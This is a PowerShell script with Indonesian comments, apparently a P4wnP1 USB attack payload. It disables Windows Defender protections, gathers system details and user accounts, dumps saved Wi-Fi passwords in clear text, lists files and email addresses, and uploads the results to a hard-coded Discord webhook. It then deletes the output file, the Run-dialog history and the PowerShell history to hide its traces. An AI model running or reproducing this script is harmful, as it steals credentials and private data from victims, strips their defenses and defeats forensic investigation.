#Mematikan Semua Fungsi Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled

#Mengambil Semua Informasi Windows Dikirim via Discord
#Mengatur Discord
$url="https://discordapp.com/api/webhooks/1080051025437798500/vWacPmGZLEDCyler5q8iHxWBHwxiqJpqzfq8XLdBeR8ErIV98A6Lq4bK4OKPR_Cgay0F";

#Mengatur Lokasi dan Nama File 
dir env: >> ReconTarget.txt;

#Mengambil Informasi Network  
Get-NetIPAddress -AddressFamily IPv4 | 
Select-Object IPAddress,SuffixOrigin | 
where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> ReconTarget.txt;
(netsh wlan show profiles) | Select-String "\:(.+)$" | 
%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | 
%{(netsh wlan show profile name="$name" key=clear)}  | 
Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); 
$_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | 
Format-Table -AutoSize >> ReconTarget.txt;

#Mengambil Informasi MAC Address
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; 
$MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17) >> ReconTarget.txt;

#Mengambil Informasi Drive
$driveType = @{
   2="Removable disk "
   3="Local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";
Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";
Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";
Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";
Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | 
Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; 
Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; 
Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; 
Expression={$_.FreeSpace_percent}; align="right"; } >> ReconTarget.txt;

#Mengambil Informasi USB
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | 
Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table >> ReconTarget.txt; 

#Mengambil Informasi Semua Akun
$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID >> ReconTarget.txt;
$fullName = Net User $Env:username | Select-String -Pattern "Full Name";
$fullName = ("$fullName").TrimStart("Full Name") >> ReconTarget.txt;

#Mengambil Daftar Semua Proses Yang Sedang Berjalan 
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine >> ReconTarget.txt;

#Mengambil Daftar Semua Proses Yang Sedang Berjalan 
tree $Env:userprofile /a /f >> ReconTarget.txt;

#Mencari alamat email 
$email = GPRESULT -Z /USER $Env:username | 
Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;
$email = ("$email").Trim() >> ReconTarget.txt; 

#Mengirimkan Hasil ReconTarget.txt ke Penyerang dengan Discord
$Body=@{ content = "Hasil Recon Target $env:computername dari P4wnP1"};
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
curl.exe -F "file1=@ReconTarget.txt" $url ; 

#Anti Forensic
Remove-Item '.\ReconTarget.txt'; 
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;
Remove-Item (Get-PSreadlineOption).HistorySavePath;
exit